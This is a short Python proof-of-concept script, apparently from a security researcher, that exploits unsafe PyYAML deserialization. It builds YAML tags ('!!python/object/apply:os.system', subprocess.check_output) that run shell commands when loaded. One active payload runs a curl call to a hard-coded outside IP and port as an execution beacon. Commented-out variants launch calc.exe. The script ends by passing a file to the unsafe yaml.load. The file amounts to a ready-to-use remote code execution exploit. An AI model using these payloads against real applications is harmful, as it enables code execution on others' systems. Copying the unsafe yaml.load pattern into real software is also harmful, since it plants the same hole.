# !/usr/bin/env python
# -*- coding:utf-8 -*-
__author__ = 'bit4'
__github__ = 'https://github.com/bit4woo'

import yaml
p = 'curl http://47.108.89.178:2333/success'
# payload = '!!python/object/apply:subprocess.check_output [[\"%s\"]]' % p
# payload = '!!python/object/apply:subprocess.check_output [\"%s\"]' % p
#payload = '!!python/object/apply:subprocess.check_output [\"%s\"]' % p
payload = '!!python/object/apply:os.system [\"%s\"]' % p
#payload = '!!python/object/new:subprocess.check_output [["calc.exe"]]'
#payload = '!!python/object/new:os.system ["calc.exe"]'


# print yaml.load(payload)

print(yaml.load(open('a.yml', 'r')))
